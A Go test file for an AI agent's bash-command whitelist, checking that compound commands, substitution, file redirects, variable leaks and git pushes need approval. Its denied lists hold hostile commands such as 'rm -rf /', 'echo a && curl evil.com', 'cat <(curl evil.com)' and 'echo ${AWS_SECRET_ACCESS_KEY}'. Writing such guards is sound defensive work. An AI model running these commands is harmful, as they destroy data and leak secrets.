package config

import (
	"strings"
	"testing"
)

// pushCfg builds a config whose only whitelist entries are the end-anchored
// git-push patterns, mirroring what users configure for branch protection. It
// exercises the interaction between redirection stripping and "$"-anchored
// patterns (a redirect suffix must not defeat the anchor).
func pushCfg() *Config {
	return &Config{
		Tools: ToolsConfig{
			Enabled: true,
			Bash: BashToolConfig{
				Enabled: true,
				Whitelist: ToolWhitelistConfig{
					Commands: []string{
						"^git push( --set-upstream)?( origin)? (feature|fix)/[a-zA-Z0-9/_.-]+$",
					},
				},
			},
		},
	}
}

func TestIsBashCommandWhitelisted_RedirectStripping(t *testing.T) {
	cfg := DefaultConfig()

	allowed := []string{
		"gh api repos/o/r/issues 2>&1",
		"gh issue list 2>/dev/null",
		"gh issue list >/dev/null 2>&1",
		"gh issue list 2>&1 >/dev/null",
		"gh pr view 5 2>&1",
		"gh api user --paginate 2>&1",
		"gh issue list &>/dev/null",
		"gh issue list 1>/dev/null",
		"git status 2>&1",
	}
	for _, cmd := range allowed {
		if !cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q to be whitelisted after stripping redirections", cmd)
		}
	}

	denied := []string{
		"gh api repos/o/r/issues -X POST 2>&1",
		"rm -rf / 2>&1",
	}
	for _, cmd := range denied {
		if cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q NOT to be whitelisted", cmd)
		}
	}

	if stripBenignTrailingRedirections("gh issue list > /etc/passwd") != "gh issue list > /etc/passwd" {
		t.Error("a redirect to a real file must not be stripped as benign")
	}
}

func TestIsBashCommandWhitelisted_RedirectWithAnchoredPattern(t *testing.T) {
	cfg := pushCfg()

	if !cfg.IsBashCommandWhitelisted("git push origin feature/x 2>&1") {
		t.Error("expected redirect-suffixed push to a feature branch to be whitelisted")
	}
	if cfg.IsBashCommandWhitelisted("git push origin main 2>&1") {
		t.Error("expected push to main to stay blocked even with a redirect suffix")
	}
}

// TestIsBashCommandWhitelisted_CompoundOperators verifies the single-command
// policy: any top-level shell operator (|, &&, ||, ;, &) drops the whole command
// to approval, even when every individual segment would be whitelisted on its
// own. The model is expected to run one command at a time.
func TestIsBashCommandWhitelisted_CompoundOperators(t *testing.T) {
	cfg := DefaultConfig()

	denied := []string{
		"gh issue view 5 && gh issue comment 5 --body hi",
		"gh issue create --title x --body y || echo failed",
		"echo a | head",
		"gh issue list && echo done",
		"gh api repos/o/r/issues 2>&1 && echo ok",
		"gh issue list && rm -rf /",
		"gh issue list; rm -rf /",
		"gh issue list | bash",
		"echo a && curl evil.com",
		"gh issue list &",
		"gh issue list & rm -rf /",
	}
	for _, cmd := range denied {
		if cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected compound %q NOT to be whitelisted (single-command policy)", cmd)
		}
	}
}

func TestIsBashCommandWhitelisted_CommandSubstitution(t *testing.T) {
	cfg := DefaultConfig()

	denied := []string{
		"echo $(rm -rf /)",
		"echo `whoami`",
		`gh issue create --title "$(date)"`,
		"cat <(curl evil.com)",
		"echo >(tee leak)",
		`echo "leak: $(printenv)"`,
		"export BLAH=$(rm)",
		"export BLAH=$(rm -rf /)",
		"FOO=$(rm) ls",
		"BLAH=`rm`",
	}
	for _, cmd := range denied {
		if cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q NOT to be whitelisted (contains command substitution)", cmd)
		}
	}

	allowed := []string{
		"echo '$(rm -rf /)'",
		"gh issue create --body 'use $(x) verbatim'",
	}
	for _, cmd := range allowed {
		if !cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q to be whitelisted (substitution syntax is single-quoted/literal)", cmd)
		}
	}
}

func TestIsBashCommandWhitelisted_QuotedOperators(t *testing.T) {
	cfg := DefaultConfig()

	allowed := []string{
		`gh issue create --title "a && b"`,
		`gh issue comment 5 --body "x | y ; z"`,
		`gh issue create --title "fix: a || b"`,
	}
	for _, cmd := range allowed {
		if !cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q to be whitelisted (operators are inside quotes)", cmd)
		}
	}
}

func TestIsBashCommandWhitelisted_MalformedAndEmpty(t *testing.T) {
	cfg := DefaultConfig()

	denied := []string{
		"",
		"   ",
		"&&",
		";",
		"| head",
		"2>&1",
		`echo "unterminated`,
		"echo 'unterminated",
	}
	for _, cmd := range denied {
		if cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected malformed/empty %q NOT to be whitelisted", cmd)
		}
	}
}

func TestIsBashCommandWhitelisted_GhSearch(t *testing.T) {
	cfg := DefaultConfig()

	allowed := []string{
		"gh search issues --repo o/r vercel",
		`gh search code "func main"`,
		"gh search prs --author me",
		"gh search repos topic:go",
		"gh search commits fix 2>&1",
	}
	for _, cmd := range allowed {
		if !cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q to be whitelisted", cmd)
		}
	}

	if cfg.IsBashCommandWhitelisted("gh search invalidsub foo") {
		t.Error("expected unknown gh search subcommand NOT to be whitelisted")
	}
}

func TestIsBashCommandWhitelisted_GhApiJq(t *testing.T) {
	cfg := DefaultConfig()

	allowed := []string{
		`gh api repos/o/r --jq '.[] | .id'`,
		`gh api repos/o/r --jq '.[] | select(.draft==false) | .title'`,
		`gh api repos/o/r/issues -q '.[] | length'`,
		`gh api repos/o/r/pulls --jq '.[] | {number, title}'`,
		`gh api repos/o/r --jq ".[] | .name"`,
		"gh api repos/o/r/issues --jq .[].title",
		"gh api user --paginate",
	}
	for _, cmd := range allowed {
		if !cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected read-only %q to be whitelisted", cmd)
		}
	}

	denied := []string{
		"gh api repos/o/r/issues -X POST",
		"gh api repos/o/r/issues --method POST",
		"gh api -X DELETE repos/o/r",
		"gh api repos/o/r -f title=x",
		`gh api repos/o/r/secrets -X POST -f value=$TOKEN`,
	}
	for _, cmd := range denied {
		if cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected mutating %q NOT to be whitelisted", cmd)
		}
	}
}

func TestIsBashCommandWhitelisted_GhApiGraphql(t *testing.T) {
	cfg := DefaultConfig()

	denied := []string{
		"gh api graphql -f query='mutation { updateIssueIssueType }'",
		`gh api graphql -f query="query { repository }"`,
		"gh api graphql -f query=xxx -f id=123",
		"gh api graphql --paginate -f query=xxx",
		"gh api graphql -X POST",
		"gh api graphql -f query=xxx && echo done",
	}
	for _, cmd := range denied {
		if cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q NOT to be whitelisted", cmd)
		}
	}

	allowed := []string{
		"gh api graphql",
		"gh api graphql --paginate",
		"gh api graphql 2>&1",
	}
	for _, cmd := range allowed {
		if !cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q to be whitelisted", cmd)
		}
	}
}

func TestIsBashCommandWhitelisted_GhProject(t *testing.T) {
	cfg := DefaultConfig()

	allowed := []string{
		"gh project item-add 7 --owner inference-gateway --url https://github.com/inference-gateway/cli/issues/123",
		"gh project item-edit 7 --item-id PVTI_xxx --field Status --value Todo",
		"gh project item-list 7 --owner inference-gateway",
		"gh project field-list 7 --owner inference-gateway",
		"gh project view 7 --owner inference-gateway",
		"gh project list --owner inference-gateway",
		"gh project item-edit 7 --item-id PVTI_xxx --field Status --value Done 2>&1",
	}
	for _, cmd := range allowed {
		if !cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q to be whitelisted", cmd)
		}
	}

	denied := []string{
		"gh project delete 7",
		"gh project item-delete 7 --item-id PVTI_xxx",
		"gh project unknown-subcommand",
	}
	for _, cmd := range denied {
		if cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q NOT to be whitelisted", cmd)
		}
	}
}

func TestIsBashCommandWhitelisted_FindActions(t *testing.T) {
	cfg := DefaultConfig()

	allowed := []string{
		"find .",
		"find . -name '*.go'",
		"find . -type f -name '*.md'",
	}
	for _, cmd := range allowed {
		if !cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected read-only %q to be whitelisted", cmd)
		}
	}

	denied := []string{
		"find . -delete",
		"find . -name secrets.yaml -delete",
		`find . -exec echo {} \;`,
		`find /etc -name '*.conf' -exec grep -l SECRET {} \;`,
		`find . -execdir rm {} \;`,
		`find . -ok rm {} \;`,
		"find . -fls /tmp/listing",
	}
	for _, cmd := range denied {
		if cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected dangerous find %q NOT to be whitelisted", cmd)
		}
	}
}

func TestIsBashCommandWhitelisted_GitStatusFlags(t *testing.T) {
	cfg := DefaultConfig()
	allowed := []string{
		"git status",
		"git status --porcelain",
		"git status -s",
		"git status --porcelain --untracked-files=all",
		"git status -sb 2>&1",
	}
	for _, cmd := range allowed {
		if !cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected read-only %q to be whitelisted", cmd)
		}
	}
}

func TestStripBenignTrailingRedirections(t *testing.T) {
	tests := []struct {
		in   string
		want string
	}{
		{"gh api repos/o/r 2>&1", "gh api repos/o/r"},
		{"gh issue list 2>/dev/null", "gh issue list"},
		{"gh issue list >/dev/null 2>&1", "gh issue list"},
		{"gh issue list 2>&1 >/dev/null", "gh issue list"},
		{"gh issue list &>/dev/null", "gh issue list"},
		{"echo hi >&2", "echo hi"},
		{"echo hi 2>&-", "echo hi"},
		{"echo hi", "echo hi"},
		{"echo /dev/null", "echo /dev/null"},
		{"gh issue list > out.txt", "gh issue list > out.txt"},
		{"2>&1", ""},
	}
	for _, tt := range tests {
		if got := stripBenignTrailingRedirections(tt.in); got != tt.want {
			t.Errorf("stripBenignTrailingRedirections(%q) = %q, want %q", tt.in, got, tt.want)
		}
	}
}

func TestSplitBashSegments(t *testing.T) {
	tests := []struct {
		in   string
		want []string
		ok   bool
	}{
		{"gh issue list", []string{"gh issue list"}, true},
		{"a && b", []string{"a", "b"}, true},
		{"a || b", []string{"a", "b"}, true},
		{"a | b", []string{"a", "b"}, true},
		{"a |& b", []string{"a", "b"}, true},
		{"a ; b", []string{"a", "b"}, true},
		{"a & b", []string{"a", "b"}, true},
		{"gh api x 2>&1 && echo y", []string{"gh api x 2>&1", "echo y"}, true},
		{"echo hi >&2", []string{"echo hi >&2"}, true},
		{"cmd &> /dev/null", []string{"cmd &> /dev/null"}, true},
		{`echo "a && b"`, []string{`echo "a && b"`}, true},
		{"echo 'a | b'", []string{"echo 'a | b'"}, true},
		{`echo "unterminated`, nil, false},
		{"echo 'unterminated", nil, false},
	}
	for _, tt := range tests {
		got, ok := splitBashSegments(tt.in)
		if ok != tt.ok {
			t.Errorf("splitBashSegments(%q) ok = %v, want %v", tt.in, ok, tt.ok)
			continue
		}
		if !ok {
			continue
		}
		trimmed := make([]string, len(got))
		for i, s := range got {
			trimmed[i] = strings.TrimSpace(s)
		}
		if strings.Join(trimmed, "\x00") != strings.Join(tt.want, "\x00") {
			t.Errorf("splitBashSegments(%q) = %v, want %v", tt.in, trimmed, tt.want)
		}
	}
}

func TestContainsCommandSubstitution(t *testing.T) {
	yes := []string{
		"echo $(x)",
		"echo `x`",
		"cat <(x)",
		"echo >(x)",
		`echo "$(x)"`,
		"echo \"`x`\"",
	}
	for _, cmd := range yes {
		if !containsCommandSubstitution(cmd) {
			t.Errorf("containsCommandSubstitution(%q) = false, want true", cmd)
		}
	}

	no := []string{
		"echo '$(x)'",
		"echo '`x`'",
		"gh api repos/o/r --jq '.a | .b'",
		"echo $HOME",
		"echo ${HOME}",
		"gh issue create --title x --body y",
	}
	for _, cmd := range no {
		if containsCommandSubstitution(cmd) {
			t.Errorf("containsCommandSubstitution(%q) = true, want false", cmd)
		}
	}
}

func TestContainsVariableExpansion(t *testing.T) {
	yes := []string{
		"echo $HOME",
		"echo ${HOME}",
		"echo $AWS_SECRET_ACCESS_KEY",
		`echo "token=$TOKEN"`,
		`echo "${AWS_SECRET_ACCESS_KEY}"`,
		"tail $SECRETFILE",
		"echo $1",
		"echo $?",
		"echo $$",
		"echo $@",
	}
	for _, cmd := range yes {
		if !containsVariableExpansion(cmd) {
			t.Errorf("containsVariableExpansion(%q) = false, want true", cmd)
		}
	}

	no := []string{
		"echo '$HOME'",
		"echo '${HOME}'",
		`echo \$HOME`,
		"echo hi",
		"echo 5 dollars",
		"echo $(date)",
		"gh api repos/o/r --jq '.a | .b'",
		"echo a$",
		"echo price$ here",
	}
	for _, cmd := range no {
		if containsVariableExpansion(cmd) {
			t.Errorf("containsVariableExpansion(%q) = true, want false", cmd)
		}
	}
}

// TestIsBashCommandWhitelisted_VariableExpansion verifies the env-var leak guard:
// $VAR may be USED in any command, but a command that prints (echo/printf) or
// publishes (gh issue/pr create|comment|edit) its arguments must not expand one,
// so the agent cannot leak a secret's value (echo $AWS_SECRET_ACCESS_KEY). A
// literal '$' (single-quoted or backslash-escaped) is always allowed.
func TestIsBashCommandWhitelisted_VariableExpansion(t *testing.T) {
	cfg := DefaultConfig()

	denied := []string{
		"echo $HOME",
		"echo ${AWS_SECRET_ACCESS_KEY}",
		`echo "leak=$TOKEN"`,
		"echo $HOME 2>&1",
		"gh issue create --title x --body $TOKEN",
		"gh issue comment 5 --body $SECRET",
		"gh pr create --title x --body $TOKEN",
	}
	for _, cmd := range denied {
		if cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q NOT to be whitelisted (would print/publish a variable's value)", cmd)
		}
	}

	allowed := []string{
		"echo '$HOME'",
		`echo \$HOME`,
		"echo hi",
		"ls $HOME",
		"tail $LOGFILE",
		"git log --format=$FMT",
		"find $DIR -name '*.go'",
		`gh issue create --body 'see $HOME'`,
	}
	for _, cmd := range allowed {
		if !cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q to be whitelisted (uses a var without printing its value)", cmd)
		}
	}
}

// TestIsBashCommandWhitelisted_EnvVarAssignments verifies that SETTING env vars is
// not auto-approved - assignment prefixes (FOO=bar cmd), export, and bare
// assignments all fall through to approval - while USING an existing variable in a
// non-printing command stays allowed.
func TestIsBashCommandWhitelisted_EnvVarAssignments(t *testing.T) {
	cfg := DefaultConfig()

	denied := []string{
		"GOOS=linux task build",
		"LANG=C sort",
		"FOO=bar ls -la",
		"export FOO=bar",
		"export FOO=$BAR",
		"FOO=bar",
		"export",
		"export -p",
	}
	for _, cmd := range denied {
		if cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q NOT to be whitelisted (setting env vars requires approval)", cmd)
		}
	}

	allowed := []string{
		"ls $HOME",
		"git log $REF",
	}
	for _, cmd := range allowed {
		if !cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q to be whitelisted (uses an existing var, no setting)", cmd)
		}
	}
}

// TestIsBashCommandWhitelisted_GitPushRequiresApproval locks in that no default
// pattern auto-whitelists "git push": every push variant must fall through to
// approval. Users who want to auto-allow a specific push add an anchored regex
// to tools.bash.whitelist.commands themselves (see TestIsBashCommandWhitelisted_
// RedirectWithAnchoredPattern); the shipped default never does.
func TestIsBashCommandWhitelisted_GitPushRequiresApproval(t *testing.T) {
	cfg := DefaultConfig()

	denied := []string{
		"git push",
		"git push origin main",
		"git push --force",
		"git push --force-with-lease origin feature/x",
		"git push origin feature/x",
		"git push 2>&1",
	}
	for _, cmd := range denied {
		if cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q NOT to be whitelisted (push must require approval)", cmd)
		}
	}
}

func TestIsBashCommandWhitelisted_FileRedirectRestricted(t *testing.T) {
	cfg := DefaultConfig()

	denied := []string{
		"echo hi > /tmp/out",
		"echo hi >> /tmp/out",
		"ls > out.txt",
		"git log > /etc/passwd",
		"git status > /tmp/x",
		"echo x &> out.txt",
		"echo x >& out.txt",
		"tail -n 5 /var/log/x > leak",
	}
	for _, cmd := range denied {
		if cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q NOT to be whitelisted (writes to a real file)", cmd)
		}
	}

	allowed := []string{
		"gh issue list >/dev/null",
		"git status 2>&1",
		"gh issue list >/dev/null 2>&1",
		`gh issue comment 5 --body "a > b"`,
		"echo 'write > file'",
	}
	for _, cmd := range allowed {
		if !cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q to be whitelisted (no real file write)", cmd)
		}
	}
}

// TestIsBashCommandWhitelisted_PatternUnlocksRedirect verifies that a whitelist
// pattern takes precedence over the redirect restriction, but only when it
// matches the WHOLE command - a prefix pattern (^git log) must not unlock a
// redirected variant.
func TestIsBashCommandWhitelisted_PatternUnlocksRedirect(t *testing.T) {
	cfg := &Config{
		Tools: ToolsConfig{
			Enabled: true,
			Bash: BashToolConfig{
				Enabled: true,
				Whitelist: ToolWhitelistConfig{
					Commands: []string{
						"^echo( |$)",
						`^echo hi > /tmp/out\.txt$`,
						`^git log`,
					},
				},
			},
		},
	}

	allowed := []string{
		"echo hi > /tmp/out.txt",
		"echo hello",
		"git log",
		"git log --oneline -5",
	}
	for _, cmd := range allowed {
		if !cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q to be whitelisted", cmd)
		}
	}

	denied := []string{
		"echo hi > /tmp/other.txt",
		"echo bye > /tmp/out.txt",
		"git log > /etc/passwd",
	}
	for _, cmd := range denied {
		if cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q NOT to be whitelisted", cmd)
		}
	}
}

// TestIsBashCommandWhitelisted_PipePolicy documents that pipelines are never
// auto-approved under the single-command policy - even when both ends are
// whitelisted (ls | head) - which also keeps the issue #560 example
// "ls | xargs rm" out of the whitelist.
func TestIsBashCommandWhitelisted_PipePolicy(t *testing.T) {
	cfg := DefaultConfig()

	denied := []string{
		"ls | head",
		"echo hi | wc -l",
		"ls | xargs rm",
		"ls | tee out.txt",
	}
	for _, cmd := range denied {
		if cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected piped %q NOT to be whitelisted (single-command policy)", cmd)
		}
	}
}

func TestContainsFileRedirect(t *testing.T) {
	tests := []struct {
		seg  string
		want bool
	}{
		{"echo hi > /tmp/out", true},
		{"echo hi >> /tmp/out", true},
		{"echo x &> out.txt", true},
		{"echo x >& out.txt", true},
		{"echo a>b", true},
		{"ls", false},
		{"git status", false},
		{`gh issue comment 5 --body "a > b"`, false},
		{"echo 'a > b'", false},
	}
	for _, tt := range tests {
		t.Run(tt.seg, func(t *testing.T) {
			if got := containsFileRedirect(tt.seg); got != tt.want {
				t.Errorf("containsFileRedirect(%q) = %v, want %v", tt.seg, got, tt.want)
			}
		})
	}
}

func TestIsBashEntryRegex(t *testing.T) {
	tests := []struct {
		entry string
		want  bool
	}{
		{"ls", false},
		{"echo", false},
		{"python3.11", false},
		{"git-lfs", false},
		{"make", false},
		{"find", false},
		{"^git log", true},
		{"^gh issue (create|edit|comment)( |$)", true},
		{"^git branch( --show-current)?$", true},
		{`^echo hi > /tmp/out\.txt$`, true},
		{"^git status( |$)", true},
	}

	for _, tt := range tests {
		t.Run(tt.entry, func(t *testing.T) {
			if got := isBashEntryRegex(tt.entry); got != tt.want {
				t.Errorf("isBashEntryRegex(%q) = %v, want %v", tt.entry, got, tt.want)
			}
		})
	}
}

func TestMatchesEntirePattern(t *testing.T) {
	tests := []struct {
		pattern string
		command string
		want    bool
	}{
		{`^echo hi > /tmp/out\.txt$`, "echo hi > /tmp/out.txt", true},
		{`^echo hi > /tmp/out\.txt$`, "echo hi > /tmp/other.txt", false},
		{`^git log`, "git log", true},
		{`^git log`, "git log > /etc/passwd", false},
		{`^git log .*$`, "git log > /etc/passwd", true},
	}
	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			if got := matchesEntirePattern(tt.pattern, tt.command); got != tt.want {
				t.Errorf("matchesEntirePattern(%q, %q) = %v, want %v", tt.pattern, tt.command, got, tt.want)
			}
		})
	}
}

func TestBashWhitelistRejectionHint(t *testing.T) {
	if h := BashWhitelistRejectionHint("echo hi > /tmp/out"); !strings.Contains(h, "redirection") {
		t.Errorf("expected a redirection hint, got %q", h)
	}
	if h := BashWhitelistRejectionHint("echo $(whoami)"); !strings.Contains(h, "substitution") {
		t.Errorf("expected a command-substitution hint, got %q", h)
	}
	if h := BashWhitelistRejectionHint("echo $HOME"); !strings.Contains(h, "environment variable") {
		t.Errorf("expected an env-var leak hint, got %q", h)
	}
	if h := BashWhitelistRejectionHint("ls | head"); !strings.Contains(h, "single command") {
		t.Errorf("expected a single-command hint, got %q", h)
	}
	if h := BashWhitelistRejectionHint("ls -la"); h != "" {
		t.Errorf("expected no hint for a plain command, got %q", h)
	}
	if h := BashWhitelistRejectionHint("ls $HOME"); h != "" {
		t.Errorf("expected no hint for using a var in a non-printing command, got %q", h)
	}
	if h := BashWhitelistRejectionHint("git status 2>&1"); h != "" {
		t.Errorf("expected no hint for a benign redirect, got %q", h)
	}
}
